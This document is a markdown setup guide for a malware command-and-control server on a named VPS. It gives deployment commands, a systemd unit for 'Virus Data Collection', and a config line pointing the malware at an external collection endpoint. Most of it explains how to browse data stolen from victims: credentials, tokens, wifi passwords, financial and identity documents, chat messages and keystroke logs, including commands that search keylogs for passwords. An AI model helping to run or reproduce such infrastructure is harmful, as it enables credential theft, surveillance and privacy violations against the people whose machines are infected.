# C2 Server Setup Guide

## Quick Setup on VPS

### 1. Upload C2 Server Script

Upload `c2_server.py` to your VPS (103.75.183.125):

```bash
scp c2_server.py user@103.75.183.125:/path/to/server/
```

### 2. Run C2 Server

SSH into your VPS and run:

```bash
cd /path/to/server
python3 c2_server.py
```

Or run in background with `nohup`:

```bash
nohup python3 c2_server.py > c2_server.log 2>&1 &
```

### 3. Configure Firewall

Make sure port 8080 is open on your VPS:

```bash
# Ubuntu/Debian
sudo ufw allow 8080/tcp

# CentOS/RHEL
sudo firewall-cmd --add-port=8080/tcp --permanent
sudo firewall-cmd --reload
```

### 4. Using systemd (Optional - Auto-start on boot)

Create `/etc/systemd/system/c2-server.service`:

```ini
[Unit]
Description=C2 Server for Virus Data Collection
After=network.target

[Service]
Type=simple
User=your_user
WorkingDirectory=/path/to/server
ExecStart=/usr/bin/python3 /path/to/server/c2_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Then enable and start:

```bash
sudo systemctl enable c2-server
sudo systemctl start c2-server
sudo systemctl status c2-server
```

## Configuration

### Change Port (if needed)

If you want to use a different port, edit `c2_server.py`:

```python
PORT = 8080  # Change to your desired port
```

And update `virus_config.py`:

```python
C2_SERVER = "http://103.75.183.125:YOUR_PORT/api/collect"
```

### Change Data Directory

Edit `c2_server.py`:

```python
DATA_DIR = "received_data"  # Change to your desired directory
```

## Received Data

All received data will be **automatically decrypted** and organized in folders by target and time:

```
received_data/
  ├── hostname1_20240101_120000/          ← Folder for each exfiltration
  │   ├── exploited_data.json            ← ✅ All exploited data (READ THIS!)
  │   ├── keyboard_log.txt                ← ⌨️ Keyboard logs (EASY ACCESS!)
  │   ├── encrypted_data.json            ← Encrypted backup
  │   └── raw_post_data.txt              ← Raw POST data (debugging)
  ├── hostname1_20240101_120100/
  │   ├── exploited_data.json
  │   ├── keyboard_log.txt
  │   ├── encrypted_data.json
  │   └── raw_post_data.txt
  └── hostname2_20240101_130000/
      └── ...
```

### File Structure:

1. **Folder Name**: `{hostname}_{YYYYMMDD_HHMMSS}/`
   - Each exfiltration gets its own folder
   - Organized by target name and timestamp

2. **`exploited_data.json`** - ✅ **All exploited data** - Main file!
   - Contains all exploited data in readable format
   - Includes: credentials, files, tokens, documents, etc.

3. **`keyboard_log.txt`** - ⌨️ **Keyboard logs** - Easy to read!
   - Extracted keyboard logs for quick access
   - All keystrokes from the victim

4. **`encrypted_data.json`** - Encrypted backup (if decryption fails)
   - Contains encrypted payload and metadata

5. **`raw_post_data.txt`** - Raw POST request data (for debugging)

## Viewing Data

### Method 1: View Latest Data (Quick)

Each exfiltration is in its own folder. View the latest:

```bash
# Find latest folder
LATEST=$(ls -td received_data/*/ | head -1)
cd "$LATEST"

# View exploited data
cat exploited_data.json | less

# View keyboard logs (already extracted!)
cat keyboard_log.txt | less

# Or use jq for pretty formatting
cat exploited_data.json | jq '.' | less
```

### Method 2: View Keyboard Logs (Easiest!)

Keyboard logs are automatically extracted to separate file:

```bash
# View keyboard logs from latest folder
cat received_data/*/keyboard_log.txt | less

# View keyboard logs from specific folder
cat received_data/hostname_20251117_203303/keyboard_log.txt | less

# View all keyboard logs from all folders
cat received_data/*/keyboard_log.txt | less
```

### Method 3: Direct View (Recommended)

```bash
# View latest exploited data
cat received_data/*/exploited_data.json | jq '.' | less

# View specific section (e.g., credentials)
cat received_data/*/exploited_data.json | jq '.unified_credentials' | less

# List all folders
ls -lth received_data/ | head -10
```

### Method 2: Using view_server_data.py

Use the viewer script to see summaries and decrypt old encrypted files:

```bash
# List all received files
python3 view_server_data.py

# View specific plain JSON file
python3 view_server_data.py received_data/hostname_20240101_120000_plain.json

# Decrypt old encrypted file
python3 view_server_data.py received_data/hostname_20240101_120000_encrypted.json
```

### Method 3: Quick Statistics

```bash
# Get statistics summary
cat received_data/*_plain.json | jq '.statistics'

# Count items
cat received_data/*_plain.json | jq '.statistics | to_entries | .[] | "\(.key): \(.value)"'
```

## Data Structure

The plain JSON contains:

```json
{
  "timestamp": "2024-01-01T12:00:00",
  "hostname": "victim-pc",
  "user": "victim",
  "statistics": {
    "unified_credentials": 15,
    "unified_files": 205,
    "unified_tokens": 8,
    "wifi_passwords": 7,
    ...
  },
  "unified_credentials": [...],
  "unified_files": [...],
  "unified_tokens": [...],
  "wifi_passwords": [...],
  "databases": [...],
  "recent_documents": [...],
  "financial_data": [...],
  "identity_documents": [...],
  "email_contacts_content": [...],
  "chat_messages": [...],
  "keyboard_logs": "...",  ← ⌨️ KEYBOARD LOGS HERE!
  "keyboard_logs_size": 12345,
  "keyboard_logs_lines": 456,
  "activity_logs": "...",  ← Same as keyboard_logs
  ...
}
```

## Viewing Keyboard Logs

Keyboard logs are stored in the `keyboard_logs` field of each `*_plain.json` file.

### Quick View:

```bash
# View keyboard logs from latest folder (already extracted!)
cat received_data/*/keyboard_log.txt | less

# Or use the viewer script
cd ~/VirusServer
bash view_keyboard_logs.sh
```

### Check Keyboard Logs:

```bash
# Check keyboard logs size in latest folder
LATEST=$(ls -td received_data/*/ | head -1)
wc -l "$LATEST/keyboard_log.txt"
ls -lh "$LATEST/keyboard_log.txt"

# Check in all folders
for folder in received_data/*/; do
    echo "$folder: $(wc -l < "$folder/keyboard_log.txt" 2>/dev/null || echo 0) lines"
done
```

### Search in Keyboard Logs:

```bash
# Search for passwords in keyboard logs (all folders)
grep -i "password" received_data/*/keyboard_log.txt

# Search for specific text in latest folder
LATEST=$(ls -td received_data/*/ | head -1)
grep "your_search_term" "$LATEST/keyboard_log.txt"

# View recent keystrokes from latest folder
LATEST=$(ls -td received_data/*/ | head -1)
tail -100 "$LATEST/keyboard_log.txt"
```

## Monitoring

Check server logs:

```bash
# If running with nohup
tail -f c2_server.log

# If running with systemd
sudo journalctl -u c2-server -f
```

## Security Notes

⚠️ **Important Security Considerations:**

1. **Use HTTPS**: For production, use HTTPS with SSL certificate
2. **Authentication**: Add authentication to prevent unauthorized access
3. **Firewall**: Only allow connections from trusted sources
4. **Encryption**: Data is already encrypted, but consider additional security layers
5. **Logging**: Monitor logs for suspicious activity

## Troubleshooting

### Server not receiving data

1. Check if server is running: `ps aux | grep c2_server`
2. Check firewall: `sudo ufw status`
3. Check if port is listening: `netstat -tuln | grep 8080`
4. Check server logs for errors

### Connection refused

1. Verify IP address in `virus_config.py` is correct
2. Check if port 8080 is open on VPS
3. Verify server is running and listening on 0.0.0.0 (not just localhost)

### Data not decrypting

1. Verify C2_KEY matches between virus and decryption script
2. Check if encrypted_data field exists in received JSON
3. Check decryption script logs for errors

